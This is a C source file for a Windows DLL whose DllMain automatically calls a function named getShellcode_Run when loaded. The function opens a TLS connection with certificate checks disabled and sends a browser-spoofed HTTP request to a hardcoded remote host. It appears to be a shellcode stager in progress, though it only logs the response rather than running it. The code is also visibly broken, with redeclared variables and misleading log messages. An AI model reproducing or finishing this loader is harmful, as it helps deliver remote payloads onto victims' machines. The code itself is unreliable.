#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#define SECURITY_WIN32
#include <sspi.h>
#include <schannel.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "secur32.lib")

#define SSL_BUFFER_SIZE 32768
#define HTTP_RESPONSE_BUFFER_SIZE 65536

// Target details
char ip[] = "www.google.com";
char port[] = "443";
char resource[] = "";
char host[] = "securitypps.com";
// Debugging function using OutputDebugString
void DebugOutput(const char* format, ...) {
    char buffer[1024];  // Adjust size as needed
    va_list args;
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);

    OutputDebugStringA(buffer);
}

// Cleanup function to handle resource deallocation
void cleanup(SOCKET* ConnectSocket, CredHandle* hCred, CtxtHandle* hContext) {
    if (hContext->dwLower || hContext->dwUpper) {
        DeleteSecurityContext(hContext);
    }
    if (hCred->dwLower || hCred->dwUpper) {
        FreeCredentialsHandle(hCred);
    }
    if (*ConnectSocket != INVALID_SOCKET) {
        closesocket(*ConnectSocket);
        *ConnectSocket = INVALID_SOCKET;
    }
    WSACleanup();
}

void getShellcode_Run(char* ip, char* port, char* resource) {
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL;
    struct addrinfo* ptr = NULL;
    struct addrinfo hints;
    char sendbuf[1024] = "";
    char sslBuf[SSL_BUFFER_SIZE] = { 0 };
    int sslBufLen = 0;
    CredHandle hCred = { 0 };
    CtxtHandle hContext = { 0 };
    DWORD dwFlags = ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_STREAM;

    // Build HTTP request
    sprintf_s(sendbuf, sizeof(sendbuf),
        "GET /%s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Connection: close\r\n"
        "Cache-Control: no-cache\r\n"
        "Pragma: no-cache\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n"
        "\r\n",
        resource, ip);
    DebugOutput("HTTP Request Built:\n%s\n", sendbuf);

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        DebugOutput("WSAStartup failed\n");
        return;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve hostname
    if (getaddrinfo(ip, port, &hints, &result) != 0) {
        DebugOutput("getaddrinfo failed\n");
        WSACleanup();
        return;
    }

    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) continue;

        if (connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }
    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        DebugOutput("Unable to connect to server\n");
        WSACleanup();
        return;
    }
    DebugOutput("Connected to server successfully\n");

    // Initialize SSL/TLS
    // Set up SCHANNEL_CRED structure
    SCHANNEL_CRED schannelCred = { 0 };
    schannelCred.dwVersion = SCHANNEL_CRED_VERSION;
    schannelCred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT; // Enable TLS 1.2 and TLS 1.3
    schannelCred.dwFlags = SCH_CRED_NO_DEFAULT_CREDS | 
                           SCH_CRED_MANUAL_CRED_VALIDATION |  // Disable automatic validation
                           SCH_CRED_IGNORE_NO_REVOCATION_CHECK | 
                           SCH_CRED_IGNORE_REVOCATION_OFFLINE; // Ignore certificate revocation checks
    
    // Acquire credentials handle
    SECURITY_STATUS secStatus = AcquireCredentialsHandleA(
        NULL,
        (LPSTR)UNISP_NAME_A,
        SECPKG_CRED_OUTBOUND,
        NULL,
        &schannelCred,
        NULL,
        NULL,
        &hCred,
        NULL
    );
    
    if (secStatus == SEC_E_OK) {
    DebugOutput("SSL handshake completed successfully\n");
    } else {
        DebugOutput("InitializeSecurityContext failed: 0x%08X\n", secStatus);
    }
    
    DebugOutput("Credentials handle acquired successfully\n");
    
    // Prepare for TLS handshake
    SecBufferDesc outBuffer;
    SecBuffer outBuffers[1];
    outBuffers[0].pvBuffer = NULL;
    outBuffers[0].BufferType = SECBUFFER_TOKEN;
    outBuffers[0].cbBuffer = 0;
    outBuffer.cBuffers = 1;
    outBuffer.pBuffers = outBuffers;
    outBuffer.ulVersion = SECBUFFER_VERSION;
    
    // Initialize Security Context
    secStatus = InitializeSecurityContextA(
        &hCred,
        NULL,
        host,  // Use the hostname of the server
        ISC_REQ_CONFIDENTIALITY | ISC_REQ_STREAM,  // Minimal flags for TLS 1.3
        0,
        0,
        NULL,
        0,
        &hContext,
        &outBuffer,
        &dwFlags,
        NULL
    );
    
    if (secStatus == SEC_I_CONTINUE_NEEDED) {
        DebugOutput("SSL handshake continuation required\n");
        send(ConnectSocket, (char*)outBuffers[0].pvBuffer, outBuffers[0].cbBuffer, 0);
        FreeContextBuffer(outBuffers[0].pvBuffer);
    } else if (secStatus == SEC_E_INCOMPLETE_MESSAGE) {
        DebugOutput("SEC_E_INCOMPLETE_MESSAGE: Waiting for more data\n");
    } else if (secStatus == SEC_E_OK) {
        DebugOutput("SSL handshake completed successfully\n");
    } else {
        DebugOutput("InitializeSecurityContext failed: 0x%08X\n", secStatus);
        cleanup(&ConnectSocket, &hCred, &hContext);
        return;
    }
    SecBufferDesc outBuffer, inBuffer;
    SecBuffer outBuffers[1], inBuffers[2];

    outBuffers[0].pvBuffer = NULL;
    outBuffers[0].BufferType = SECBUFFER_TOKEN;
    outBuffers[0].cbBuffer = 0;
    outBuffer.cBuffers = 1;
    outBuffer.pBuffers = outBuffers;
    outBuffer.ulVersion = SECBUFFER_VERSION;

    secStatus = InitializeSecurityContextA(&hCred, NULL, ip, dwFlags, 0, 0, NULL, 0, &hContext, &outBuffer, &dwFlags, NULL);
    if (secStatus != SEC_I_CONTINUE_NEEDED) {
        DebugOutput("InitializeSecurityContext failed: 0x%08X\n", secStatus);
        cleanup(&ConnectSocket, &hCred, &hContext);
        return;
    }

    send(ConnectSocket, (char*)outBuffers[0].pvBuffer, outBuffers[0].cbBuffer, 0);
    FreeContextBuffer(outBuffers[0].pvBuffer);

    // SSL Handshake Loop
    bool handshakeComplete = false;
    while (!handshakeComplete) {
        int bytesReceived = recv(ConnectSocket, sslBuf + sslBufLen, sizeof(sslBuf) - sslBufLen, 0);
        if (bytesReceived <= 0) {
            if (bytesReceived == 0) {
                DebugOutput("Connection closed by peer.\n");
            } else {
                DebugOutput("recv failed: %d\n", WSAGetLastError());
            }
            cleanup(&ConnectSocket, &hCred, &hContext);
            return;
        }
    
        sslBufLen += bytesReceived;
        DebugOutput("Received %d bytes during handshake\n", bytesReceived);
    
        inBuffers[0].pvBuffer = sslBuf;
        inBuffers[0].cbBuffer = sslBufLen;
        inBuffers[0].BufferType = SECBUFFER_TOKEN;
        inBuffers[1].BufferType = SECBUFFER_EMPTY;
        inBuffer.cBuffers = 2;
        inBuffer.pBuffers = inBuffers;
        inBuffer.ulVersion = SECBUFFER_VERSION;
    
        outBuffers[0].BufferType = SECBUFFER_TOKEN;
        outBuffers[0].pvBuffer = NULL;
        outBuffers[0].cbBuffer = 0;
    
        secStatus = InitializeSecurityContextA(&hCred, &hContext, NULL, dwFlags, 0, 0, &inBuffer, 0, &hContext, &outBuffer, &dwFlags, NULL);
        DebugOutput("InitializeSecurityContext returned: 0x%08X\n", secStatus);

        if (secStatus == SEC_E_OK) {
            DebugOutput("SSL handshake completed successfully\n");
            handshakeComplete = true;
        } else if (secStatus == SEC_I_CONTINUE_NEEDED) {
            send(ConnectSocket, (char*)outBuffers[0].pvBuffer, outBuffers[0].cbBuffer, 0);
            FreeContextBuffer(outBuffers[0].pvBuffer);
        } else if (secStatus == SEC_E_INCOMPLETE_MESSAGE) {
            DebugOutput("Incomplete message, waiting for more data...\n");
            continue;
        } else {
            DebugOutput("InitializeSecurityContext failed: 0x%08X\n", secStatus);
            cleanup(&ConnectSocket, &hCred, &hContext);
            return;
        }

        if (inBuffers[1].BufferType == SECBUFFER_EXTRA) {
            memmove(sslBuf, sslBuf + (sslBufLen - inBuffers[1].cbBuffer), inBuffers[1].cbBuffer);
            sslBufLen = inBuffers[1].cbBuffer;
        } else {
            sslBufLen = 0;
        }
    }

    // Send HTTP Request
    DebugOutput("Sending HTTP request...\n");
    send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);

    // Receive HTTP Response
    char responseBuffer[HTTP_RESPONSE_BUFFER_SIZE] = { 0 };
    int responseLen = 0;
    DebugOutput("Receiving HTTP response...\n");
    while ((responseLen = recv(ConnectSocket, responseBuffer, sizeof(responseBuffer) - 1, 0)) > 0) {
        responseBuffer[responseLen] = '\0'; // Null-terminate the response
        DebugOutput("%s", responseBuffer);
    }
    if (responseLen < 0) {
        DebugOutput("Error receiving HTTP response: %d\n", WSAGetLastError());
    }

    cleanup(&ConnectSocket, &hCred, &hContext);
    DebugOutput("Cleaned up resources\n");
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        getShellcode_Run(ip, port, resource);
        break;
    }
    return TRUE;
}
